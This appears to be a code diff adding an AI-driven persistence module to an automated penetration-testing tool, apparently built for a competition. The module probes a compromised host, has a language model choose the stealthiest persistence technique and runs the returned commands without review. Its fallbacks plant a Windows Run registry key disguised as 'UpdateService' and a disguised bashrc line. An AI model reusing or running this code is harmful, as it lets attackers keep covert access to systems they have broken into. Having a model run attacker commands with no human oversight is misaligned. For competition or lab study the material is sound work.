@@ -974,3 +974,181 @@ class IntelligentPathSelector:
 
         best = candidates[0]
         return f"Selected {best['ip']} ({best['reason']}) with score {best['score']['total']}"
+
+
+class PersistenceHandler:
+    """
+    AI驱动的持久化处理器
+
+    设计原则:
+    - 让AI分析环境并决定最佳策略
+    - 不预定义方法列表，避免硬编码规则
+    - 简洁有效，代码清晰
+
+    比赛关键: 第三赛区多层网络需要权限维持
+    """
+
+    @classmethod
+    def establish_persistence(cls, session: Dict) -> OperationResult:
+        """
+        AI驱动建立持久化访问
+
+        流程:
+        1. 收集环境信息
+        2. AI分析并决定策略
+        3. 执行AI建议的命令
+        4. 验证持久化有效
+        """
+        # Step 1: 收集环境信息
+        env_info = cls._collect_env_info(session)
+        os_type = session.get("os_type", "linux").lower()
+
+        # Step 2: AI分析并决定策略
+        ai_decision = cls._ai_decide_persistence(os_type, env_info)
+
+        if not ai_decision.get("commands"):
+            return OperationResult(
+                status=OperationStatus.FAILED,
+                message="AI未能生成有效的持久化命令",
+                data={"ai_response": ai_decision},
+                next_steps=["检查环境信息", "尝试手动持久化"]
+            )
+
+        # Step 3: 执行AI建议的命令
+        results = []
+        for cmd in ai_decision["commands"]:
+            result = PrivilegeEscalation._execute_command(session, cmd)
+            results.append({
+                "command": cmd,
+                "success": result.get("success", False),
+                "output": result.get("output", "")[:200]
+            })
+
+        # Step 4: 验证持久化有效
+        successful = [r for r in results if r["success"]]
+        if successful:
+            return OperationResult(
+                status=OperationStatus.SUCCESS,
+                message=f"持久化建立成功: {ai_decision.get('method', 'unknown')}",
+                data={
+                    "method": ai_decision.get("method"),
+                    "results": results,
+                    "cleanup_commands": ai_decision.get("cleanup_commands", [])
+                },
+                next_steps=["验证持久化", "继续操作"],
+                rollback_cmd=ai_decision.get("cleanup_commands", [None])[0]
+            )
+
+        return OperationResult(
+            status=OperationStatus.FAILED,
+            message="所有持久化命令执行失败",
+            data={"attempts": results, "ai_decision": ai_decision},
+            next_steps=["检查权限", "尝试其他方法"]
+        )
+
+    @classmethod
+    def _collect_env_info(cls, session: Dict) -> Dict:
+        """收集环境信息供AI分析"""
+        os_type = session.get("os_type", "linux").lower()
+
+        # 执行环境探测命令
+        if os_type == "windows":
+            commands = {
+                "whoami": "whoami",
+                "privileges": "whoami /priv 2>&1",
+                "admin_check": "net session 2>&1 || echo NOT_ADMIN"
+            }
+        else:
+            commands = {
+                "whoami": "id",
+                "crontab": "crontab -l 2>&1 || echo NO_CRONTAB",
+                "writable_dirs": "ls -la /tmp ~/. 2>/dev/null | head -10"
+            }
+
+        results = {}
+        for name, cmd in commands.items():
+            result = PrivilegeEscalation._execute_command(session, cmd)
+            results[name] = result.get("output", "")[:500]
+
+        return results
+
+    @classmethod
+    def _ai_decide_persistence(cls, os_type: str, env_info: Dict) -> Dict:
+        """
+        AI决策持久化策略
+
+        让AI根据环境信息自主选择最佳方法
+        """
+        try:
+            from llm_client import llm_client
+            from config import config
+
+            prompt = f"""你是渗透测试专家。根据目标环境，选择最佳的持久化方法并生成命令。
+
+目标系统: {os_type}
+环境信息:
+{json.dumps(env_info, ensure_ascii=False, indent=2)}
+
+要求:
+1. 选择最隐蔽且可行的持久化方法
+2. 生成具体的执行命令
+3. 同时生成清理命令
+
+输出JSON格式:
+{{
+    "method": "方法名称",
+    "reason": "选择理由",
+    "commands": ["要执行的命令列表"],
+    "cleanup_commands": ["清理命令列表"],
+    "stealth_level": 1-5
+}}
+
+{"Windows常见方法: 计划任务、注册表Run、服务、WMI事件" if os_type == "windows" else "Linux常见方法: crontab、systemd、bashrc、SSH密钥"}
+
+选择权限允许的最隐蔽方法。"""
+
+            response = llm_client.call_chat_completion(
+                model=config.HAIKU_MODEL,
+                messages=[{"role": "user", "content": prompt}],
+                json_mode=True,
+                timeout=30
+            )
+
+            if response:
+                return json.loads(response)
+
+        except Exception as e:
+            pass
+
+        # 降级策略：简单的默认命令
+        if os_type == "windows":
+            return {
+                "method": "registry_run",
+                "reason": "fallback: 最低权限要求",
+                "commands": ['reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateService" /t REG_SZ /d "cmd /c whoami" /f'],
+                "cleanup_commands": ['reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateService" /f']
+            }
+        else:
+            return {
+                "method": "bashrc",
+                "reason": "fallback: 用户级持久化",
+                "commands": ["echo '# Update check\\nwhoami' >> ~/.bashrc"],
+                "cleanup_commands": ["sed -i '/Update check/d' ~/.bashrc"]
+            }
+
+    @classmethod
+    def verify_persistence(cls, session: Dict, method: str = None) -> bool:
+        """验证持久化是否有效 - AI驱动"""
+        env_info = cls._collect_env_info(session)
+
+        # 简单验证：检查环境变化
+        if method == "registry_run":
+            result = PrivilegeEscalation._execute_command(
+                session, 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'
+            )
+            return "UpdateService" in result.get("output", "")
+        elif method == "bashrc":
+            result = PrivilegeEscalation._execute_command(session, "cat ~/.bashrc | grep -c Update")
+            return "1" in result.get("output", "0")
+
+        return False
